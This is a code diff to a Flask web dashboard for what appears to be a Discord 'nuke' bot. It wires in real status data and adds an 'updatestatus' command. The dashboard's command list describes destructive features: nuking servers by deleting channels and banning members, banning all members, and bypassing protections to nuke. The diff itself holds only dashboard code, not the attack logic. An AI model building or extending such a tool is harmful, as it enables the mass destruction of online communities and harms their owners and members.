@@ -35,9 +35,17 @@ def save_status(data):
     with open(STATUS_FILE, 'w') as f:
         json.dump(data, f)
 
+def load_bot_status():
+    try:
+        with open('bot_status.json', 'r') as f:
+            return json.load(f)
+    except:
+        return {"servers": 0, "online": False, "uptime": "Unknown"}
+
 @app.route('/')
 def dashboard():
     status = load_status()
+    bot_status = load_bot_status()
     commands = [
         'nuke - Nukes the server by deleting channels, creating new ones, banning members, etc.',
         'banall - Bans all members in the server',
@@ -50,12 +58,13 @@ def dashboard():
         'addpremium - Adds a user to premium',
         'removepremium - Removes a user from premium',
         'bypassnuke - Bypasses protections and nukes',
-        'slashbypassnuke - Slash command version of bypass nuke'
+        'slashbypassnuke - Slash command version of bypass nuke',
+        'updatestatus - Updates bot status from dashboard'
     ]
 
-    # Placeholder for dynamic data - in a real implementation, this would fetch from the bot
-    servers = "Connected to multiple servers (dynamic data not implemented yet)"
-    bot_status = "Online (assuming bot is running)"
+    # Real data from bot
+    servers = f"Connected to {bot_status['servers']} servers"
+    bot_status_text = "Online" if bot_status['online'] else "Offline"
 
     html = f"""
     <!DOCTYPE html>
@@ -194,7 +203,7 @@ def dashboard():
             <div class="dashboard-grid">
                 <div class="card">
                     <h2>📊 Status</h2>
-                    <span class="status online">{bot_status}</span>
+                    <span class="status online">{bot_status_text}</span>
                 </div>
                 
                 <div class="card">
